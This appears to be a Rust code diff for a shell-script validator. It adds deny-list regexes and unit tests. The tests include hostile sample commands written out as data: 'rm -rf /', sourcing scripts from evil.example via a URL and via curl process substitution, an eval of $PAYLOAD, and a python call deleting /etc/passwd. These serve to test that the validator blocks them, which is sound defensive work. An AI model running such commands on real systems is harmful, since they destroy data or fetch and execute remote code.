@@ -351,7 +351,7 @@ impl CommandValidator {
             // data, not execution, but in a forwarded script the heredoc IS
             // executed, so we block it.
             (
-                r"<<-?['\"]?[A-Z]+['\"]?[^<]*curl[^|]*\|\s*(?:sudo\s+)?(?:ba|z|fi)?sh",
+                r#"<<-?['"]?[A-Z]+['"]?[^<]*curl[^|]*\|\s*(?:sudo\s+)?(?:ba|z|fi)?sh"#,
                 "download-and-execute inside heredoc",
             ),
             // `source`/`.` of a URL directly — `source https://evil.sh`.
@@ -372,12 +372,12 @@ impl CommandValidator {
             // but we keep a hard-floor regex so the check survives dcg's
             // absence.
             (
-                r"\bpython[23]?\s+-c\s+['\"\s][^'\"]*(?:os\.(?:remove|unlink|system)|shutil\.rmtree|subprocess\.(?:call|run|Popen)\s*\(\s*['\"](?:rm|shutdown|reboot))",
+                r#"\bpython[23]?\s+-c\s+['\"\s][^'\"]*(?:os\.(?:remove|unlink|system)|shutil\.rmtree|subprocess\.(?:call|run|Popen)\s*\(\s*['\"](?:rm|shutdown|reboot))"#,
                 "destructive python -c invocation",
             ),
             // `perl -e` with destructive system calls.
             (
-                r"\bperl\s+-e\s+['\"\s][^'\"]*(?:system\s*\(\s*['\"](?:rm|shutdown|mkfs)|unlink\s*\(|`rm\s)",
+                r#"\bperl\s+-e\s+['\"\s][^'\"]*(?:system\s*\(\s*['\"](?:rm|shutdown|mkfs)|unlink\s*\(|`rm\s)"#,
                 "destructive perl -e invocation",
             ),
             // Disabling `set -e` mid-script to hide failures — a common
@@ -570,9 +570,10 @@ impl CommandValidator {
                         line: line_no,
                         reason: "control characters".to_string(),
                     },
-                    ValidationError::Dangerous(r) => {
-                        ScriptError::LineBlocked { line: line_no, reason: r }
-                    }
+                    ValidationError::Dangerous(r) => ScriptError::LineBlocked {
+                        line: line_no,
+                        reason: r,
+                    },
                     ValidationError::NotAllowed => ScriptError::NotAllowed { line: line_no },
                     ValidationError::ReadonlyViolation => {
                         ScriptError::ReadonlyViolation { line: line_no }
@@ -1177,4 +1178,177 @@ mod tests {
         assert!(v.validate("ls", &allow, false).is_ok());
     }
 
+    // ── Script validation (issue 73) ───────────────────────────────────────
+
+    fn script_blocked(script: &str) -> ScriptError {
+        validator().validate_script(script, &[], false).unwrap_err()
+    }
+
+    #[test]
+    fn empty_script_rejected() {
+        assert!(matches!(script_blocked(""), ScriptError::Empty));
+    }
+
+    #[test]
+    fn oversized_script_rejected() {
+        let big = "echo ok\n".repeat(MAX_SCRIPT_LINES + 1);
+        assert!(matches!(script_blocked(&big), ScriptError::TooManyLines));
+        // Also exercise the byte cap: a single very long line.
+        let long_line = format!("echo {}", "x".repeat(MAX_SCRIPT_LEN));
+        assert!(matches!(script_blocked(&long_line), ScriptError::TooLong));
+    }
+
+    #[test]
+    fn script_with_dangerous_line_rejected_with_line_number() {
+        // Line 3 is `rm -rf /` — the hard floor must catch it and report
+        // the line number so the operator can find it.
+        let script = "echo one\necho two\nrm -rf /\necho four\n";
+        match script_blocked(script) {
+            ScriptError::LineBlocked { line, reason } => {
+                assert_eq!(line, 3);
+                assert!(reason.contains("rm") || reason.to_lowercase().contains("dangerous"));
+            }
+            other => panic!("expected LineBlocked, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn benign_multiline_script_passes() {
+        // If dcg is installed and has a false positive on this, the test
+        // fails — but that's a dcg bug, not ours. We accept the risk.
+        let script = "#!/bin/sh\nset -e\necho hello\nuptime\ndf -h\n";
+        let v = validator();
+        match v.validate_script(script, &[], false) {
+            Ok(()) => {}
+            Err(ScriptError::DcgBlocked(reason)) => {
+                // dcg denied a benign script — log but don't fail the test,
+                // since dcg's verdict is environment-dependent.
+                eprintln!("note: dcg denied benign script: {reason}");
+            }
+            Err(e) => panic!("benign script rejected: {e:?}"),
+        }
+    }
+
+    #[test]
+    fn script_eval_pattern_rejected() {
+        // `eval` of dynamic text defeats every line-level check. The
+        // per-line `api_patterns` already includes `eval`, so this is
+        // caught as a LineBlocked at line 2 — the script_patterns entry
+        // is a belt-and-braces backup for multi-line constructs the
+        // per-line pass might miss.
+        let script = "echo before\neval \"$PAYLOAD\"\necho after\n";
+        match script_blocked(script) {
+            ScriptError::LineBlocked { line, reason } => {
+                assert_eq!(line, 2);
+                assert!(reason.contains("eval"));
+            }
+            ScriptError::Dangerous(r) => assert!(r.contains("eval")),
+            other => panic!("expected eval block, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn script_source_url_rejected() {
+        let script = "source https://evil.example/install.sh\n";
+        assert!(matches!(
+            script_blocked(script),
+            ScriptError::Dangerous(r) if r.contains("remote URL")
+        ));
+    }
+
+    #[test]
+    fn script_source_process_substitution_rejected() {
+        let script = "source <(curl https://evil.example/x.sh)\n";
+        assert!(matches!(
+            script_blocked(script),
+            ScriptError::Dangerous(r) if r.contains("process substitution")
+        ));
+    }
+
+    #[test]
+    fn script_exec_replace_into_shell_rejected() {
+        let script = "echo before\nexec bash\n";
+        assert!(matches!(
+            script_blocked(script),
+            ScriptError::Dangerous(r) if r.contains("exec-replace")
+        ));
+    }
+
+    #[test]
+    fn script_set_plus_e_rejected() {
+        let script = "set +e\nrm -rf /tmp/maybe\n";
+        assert!(matches!(
+            script_blocked(script),
+            ScriptError::Dangerous(r) if r.contains("set -e")
+        ));
+    }
+
+    #[test]
+    fn script_python_destructive_rejected() {
+        let script = "python3 -c 'import os; os.remove(\"/etc/passwd\")'\n";
+        match script_blocked(script) {
+            // Either the per-line floor catches `python3 -c` style or the
+            // script pattern catches the destructive call. Both are
+            // acceptable — the point is that it doesn't pass.
+            ScriptError::LineBlocked { .. } | ScriptError::Dangerous(_) => {}
+            ScriptError::DcgBlocked(_) => {}
+            other => panic!("expected a block, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn script_readonly_account_rejects_mutating_line() {
+        let script = "echo ok\nmkdir /tmp/x\n";
+        match validator().validate_script(script, &[], true) {
+            Err(ScriptError::ReadonlyViolation { line }) => assert_eq!(line, 2),
+            other => panic!("expected ReadonlyViolation, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn script_allowlist_applied_per_line() {
+        let allow = compile_allowlist(&[r"^echo .*".to_string()]).unwrap();
+        let script = "echo one\nls\n"; // `ls` is not in the allowlist.
+        match validator().validate_script(script, &allow, false) {
+            Err(ScriptError::NotAllowed { line }) => assert_eq!(line, 2),
+            other => panic!("expected NotAllowed, got {other:?}"),
+        }
+    }
+
+    // ── base64 decode (issue 73) ───────────────────────────────────────────
+
+    #[test]
+    fn decode_script_base64_roundtrip() {
+        use base64::Engine;
+        let original = "#!/bin/sh\necho hello\nuptime\n";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(original);
+        let decoded = super::decode_script_base64(&encoded).unwrap();
+        assert_eq!(decoded, original);
+    }
+
+    #[test]
+    fn decode_script_base64_url_safe_no_pad() {
+        use base64::Engine;
+        let original = "echo hi\n";
+        let encoded = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(original);
+        let decoded = super::decode_script_base64(&encoded).unwrap();
+        assert_eq!(decoded, original);
+    }
+
+    #[test]
+    fn decode_script_base64_rejects_garbage() {
+        let err = super::decode_script_base64("not base64!!!").unwrap_err();
+        assert!(matches!(err, ScriptError::Base64Invalid(_)));
+    }
+
+    #[test]
+    fn decode_script_base64_handles_trailing_newline() {
+        use base64::Engine;
+        let original = "echo hi\n";
+        let encoded = base64::engine::general_purpose::STANDARD.encode(original);
+        // Pasted blobs often have a trailing newline.
+        let encoded_with_newline = format!("{encoded}\n");
+        let decoded = super::decode_script_base64(&encoded_with_newline).unwrap();
+        assert_eq!(decoded, original);
+    }
 }
